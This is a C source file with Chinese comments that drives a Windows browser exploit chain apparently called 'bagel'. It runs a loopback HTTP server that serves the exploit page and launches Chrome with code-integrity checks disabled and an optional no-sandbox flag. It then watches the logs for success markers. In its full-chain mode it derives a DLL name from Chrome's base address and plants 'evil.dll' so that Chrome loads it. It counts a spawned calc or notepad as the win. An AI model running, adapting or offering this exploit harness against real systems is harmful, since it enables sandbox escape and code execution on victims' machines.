/* runner.c — bagel 链 Windows 运行器（无 python 依赖）
 * 内嵌 HTTP 服务器（服务 win/ 目录）+ 拉 chrome + 抓 stdout/stderr + 标记判定。
 * 用法：runner.exe --chrome <chrome.exe> [--page run.html] [--attempts N] [--timeout S]
 *            [--nosandbox] [--keep] [--arg "..."]*
 * --keep  : 命中后不杀 chrome（供外部 RPM/观察）
 * 判定（stdout 混流）：WINPWNED / RAW_NATIVE / FAIL
 */
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

static int g_port = 8765;

static void logline(const char* pfx, const char* buf, DWORD n) {
  fprintf(stdout, "%s", pfx);
  fwrite(buf, 1, n, stdout);
  fflush(stdout);
}

/* ---- 极简 HTTP 文件服务（单线程，够用） ---- */
static const char* mime_for(const char* name) {
  if (strstr(name, ".html")) return "text/html";
  if (strstr(name, ".js")) return "application/javascript";
  return "application/octet-stream";
}
static DWORD serve(SOCKET c, const char* root) {
  char req[2048] = {0};
  int rn = recv(c, req, sizeof req - 1, 0);
  if (rn <= 0) return 0;
  {
    FILE* rf = fopen("C:\\pwn\\chain-bagel-87491-85046\\win\\req.log", "a");
    if (rf) { fprintf(rf, "%s\n", req); fclose(rf); }
  }
  char path[512] = {0};
  if (sscanf(req, "GET /%255s", path) != 1) return 0;
  char* q = strchr(path, '?'); if (q) *q = 0;
  if (!*path) strcpy(path, "index.html");
  char full[1024];
  _snprintf(full, sizeof full, "%s\\%s", root, path);
  FILE* f = fopen(full, "rb");
  char hdr[512];
  if (!f) {
    _snprintf(hdr, sizeof hdr, "HTTP/1.0 404 NF\r\nContent-Length: 0\r\n\r\n");
    send(c, hdr, (int)strlen(hdr), 0);
    return 0;
  }
  fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
  _snprintf(hdr, sizeof hdr,
            "HTTP/1.0 200 OK\r\nContent-Type: %s\r\nContent-Length: %ld\r\n\r\n",
            mime_for(path), sz);
  send(c, hdr, (int)strlen(hdr), 0);
  char b[16384]; size_t g;
  while ((g = fread(b, 1, sizeof b, f)) > 0) send(c, b, (int)g, 0);
  fclose(f);
  return 0;
}

static DWORD WINAPI httpd(LPVOID arg) {
  const char* root = (const char*)arg;
  WSADATA wd;
  WSAStartup(MAKEWORD(2, 2), &wd);
  SOCKET l = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in a;
  a.sin_family = AF_INET;
  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  a.sin_port = htons((u_short)g_port);
  while (bind(l, (struct sockaddr*)&a, sizeof a) < 0) {
    g_port++;
    a.sin_port = htons((u_short)g_port);
    if (g_port > 9000) { fprintf(stderr, "[runner] no port\n"); return 1; }
  }
  listen(l, 16);
  printf("[runner] http://127.0.0.1:%d/\n", g_port);
  {
    FILE* pf2 = fopen("port.txt", "w");
    if (pf2) { fprintf(pf2, "%d\n", g_port); fclose(pf2); }
  }
  fflush(stdout);
  for (;;) {
    SOCKET c = accept(l, NULL, NULL);
    if (c == INVALID_SOCKET) continue;
    serve(c, root);
    closesocket(c);
  }
}

int main(int argc, char** argv) {
  const char* chrome = NULL, * page = "run.html";
  int attempts = 5, timeout = 25, nosandbox = 0, keep = 0, nolaunch = 0;
  char extra[1024] = "";
  char root[MAX_PATH];
  GetModuleFileNameA(NULL, root, MAX_PATH);
  char* sl = strrchr(root, '\\');
  if (sl) *sl = 0;
  for (int i = 1; i < argc; i++) {
    if (!strcmp(argv[i], "--chrome") && i + 1 < argc) chrome = argv[++i];
    else if (!strcmp(argv[i], "--page") && i + 1 < argc) page = argv[++i];
    else if (!strcmp(argv[i], "--attempts") && i + 1 < argc) attempts = atoi(argv[++i]);
    else if (!strcmp(argv[i], "--timeout") && i + 1 < argc) timeout = atoi(argv[++i]);
    else if (!strcmp(argv[i], "--nosandbox")) nosandbox = 1;
    else if (!strcmp(argv[i], "--nolaunch")) nolaunch = 1;
    else if (!strcmp(argv[i], "--keep")) keep = 1;
    else if (!strcmp(argv[i], "--arg") && i + 1 < argc) {
      strncat(extra, " ", sizeof extra - strlen(extra) - 1);
      strncat(extra, argv[++i], sizeof extra - strlen(extra) - 1);
    }
  }
  if (!chrome && !nolaunch) { fprintf(stderr, "usage: runner --chrome <exe> [--page run.html] ...\n"); return 2; }

  CreateThread(NULL, 0, httpd, root, 0, NULL);
  Sleep(300);

  if (nolaunch) {
    /* 仅 HTTP 服务模式（由外部 PowerShell 驱动 chrome） */
    printf("[runner] server-only, waiting forever\n");
    fflush(stdout);
    Sleep(INFINITE);
  }

  for (int att = 1; att <= attempts; att++) {
    printf("=== attempt %d/%d ===\n", att, attempts);
    fflush(stdout);
    char prof[MAX_PATH], cmd[4096];
    _snprintf(prof, sizeof prof, "C:\\pwn\\chain-bagel-87491-85046\\win\\prof%d_%d",
              (int)GetTickCount(), att);
    _snprintf(cmd, sizeof cmd,
              "\"%s\" --user-data-dir=%s --no-first-run --no-default-browser-check "
              "--enable-logging --log-file=C:\\pwn\\chain-bagel-87491-85046\\win\\chrome_out.log "
              "--disable-features=RendererCodeIntegrity %s "
              "\"http://127.0.0.1:%d/%s\"",
              chrome, prof, nosandbox ? "--no-sandbox" : "", g_port, page);
    if (extra[0]) strncat(cmd, extra, sizeof cmd - strlen(cmd) - 1);
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof si); si.cb = sizeof si;
    memset(&pi, 0, sizeof pi);
    DeleteFileA("C:\\pwn\\chain-bagel-87491-85046\\win\\chrome_out.log");
    /* chrome 目录保持纯净（往 exe 目录投放文件会让沙箱启动报 0x5）；
       DLL 投 runner 自身 CWD（chrome 继承之，LoadLibraryW 搜索序含 CWD）。
       不给 chrome 设 lpCurrentDirectory——沙箱 broker 拒绝异 CWD（实测 0x5）。 */
    SetCurrentDirectoryA("C:\\pwn\\chain-bagel-87491-85046\\win");
    {
      char cmd2[512];
      _snprintf(cmd2, sizeof cmd2,
                "cmd /c del /q C:\\pwn\\chain-bagel-87491-85046\\win\\*.dll");
      system(cmd2);
    }
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
      fprintf(stderr, "[runner] CreateProcess failed %lu\n", GetLastError());
      return 1;
    }
    CloseHandle(pi.hThread);
    printf("[runner] chrome pid=%lu url=/%s\n", (unsigned long)pi.dwProcessId, page);
    fflush(stdout);
    /* 终局链布防：读 chrome.exe 基址（per-boot 恒定），按 plant+0x10 的字节
       得宽字符名，把 evil.dll 投到 runner CWD（chrome 继承 → LoadLibraryW
       搜索序含 CWD）。注意：外部对本进程做模块快照/写文件会干扰沙箱子进程
       孵化（0x5），故等页面首条 CONSOLE（渲染器已活）再动。 */
    if (strstr(page, "run_full")) {
      for (int w = 0; w < 100; w++) {
        Sleep(200);
        FILE* pf = fopen("C:\\pwn\\chain-bagel-87491-85046\\win\\chrome_out.log", "rb");
        if (pf) {
          static char pre[1 << 20];
          size_t n = fread(pre, 1, sizeof pre - 1, pf);
          pre[n] = 0;
          fclose(pf);
          if (strstr(pre, "CONSOLE")) break;
        }
      }
      HANDLE qs = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
                                           pi.dwProcessId);
      if (qs != INVALID_HANDLE_VALUE) {
        MODULEENTRY32 me;
        me.dwSize = sizeof me;
        uint64_t cbase = 0;
        if (Module32First(qs, &me)) cbase = (uint64_t)(uintptr_t)me.modBaseAddr;
        CloseHandle(qs);
        if (cbase) {
          uint64_t q = cbase + 0x3CC810;
          wchar_t name[8];
          for (int w = 0; w < 3; w++)
            name[w] = (wchar_t)((q >> (16 * w)) & 0xFFFF);
          name[3] = L'.'; name[4] = L'd'; name[5] = L'l'; name[6] = L'l'; name[7] = 0;
          wchar_t wpath[MAX_PATH + 16];
          _snwprintf(wpath, sizeof wpath / sizeof(wpath[0]),
                     L"C:\\pwn\\chain-bagel-87491-85046\\win\\%s", name);
          /* 复制 C:\pwn\evil.dll */
          wchar_t wsrc[MAX_PATH];
          MultiByteToWideChar(CP_ACP, 0, "C:\\pwn\\evil.dll", -1, wsrc, MAX_PATH);
          if (CopyFileW(wsrc, wpath, FALSE)) {
            printf("[runner] evil.dll planted: base=0x%llx name=%04x.%04x.%04x.dll\n",
                   (unsigned long long)cbase, (unsigned)name[0], (unsigned)name[1],
                   (unsigned)name[2]);
          } else {
            printf("[runner] dll plant FAILED err=%lu (base=0x%llx)\n",
                   GetLastError(), (unsigned long long)cbase);
          }
          fflush(stdout);
        }
      }
    }
    /* 轮询 chrome_out.log 文件检测标记（句柄共享指针不可靠） */
    DWORD t0 = GetTickCount();
    int hit = 0;
    while (GetTickCount() - t0 < (DWORD)timeout * 1000) {
      Sleep(300);
      FILE* tf = fopen("C:\\pwn\\chain-bagel-87491-85046\\win\\chrome_out.log", "rb");
      if (tf) {
        static char acc[1 << 20];
        size_t n = fread(acc, 1, sizeof acc - 1, tf);
        acc[n] = 0;
        fclose(tf);
        if (strstr(acc, "WINPWNED") || strstr(acc, "RAW_NATIVE") || strstr(acc, "DEPLOYED")) {
          printf("%s", n > 2000 ? acc + n - 2000 : acc);
          fflush(stdout);
          hit = 1;
          break;
        }
      }
    }
    /* 终局链：chrome 死后轮询 calc/notepad（evil.dll DllMain 的产物） */
    if (hit && strstr(page, "run_full")) {
      for (int w = 0; w < 10; w++) {
        Sleep(1000);
        if (system("tasklist | findstr /I \"notepad CalculatorApp\" > NUL") == 0) {
          printf("=== CHAIN WIN: calc/notepad spawned ===\n");
          fflush(stdout);
          break;
        }
      }
    }
    if (!keep) {
      TerminateProcess(pi.hProcess, 0);
      WaitForSingleObject(pi.hProcess, 3000);
    } else {
      printf("[runner] keeping chrome pid=%lu (观察用)\n", (unsigned long)pi.dwProcessId);
    }
    CloseHandle(pi.hProcess);

    if (hit) { printf("=== HIT on attempt %d ===\n", att); return 0; }
  }
  printf("=== no hit ===\n");
  return 1;
}
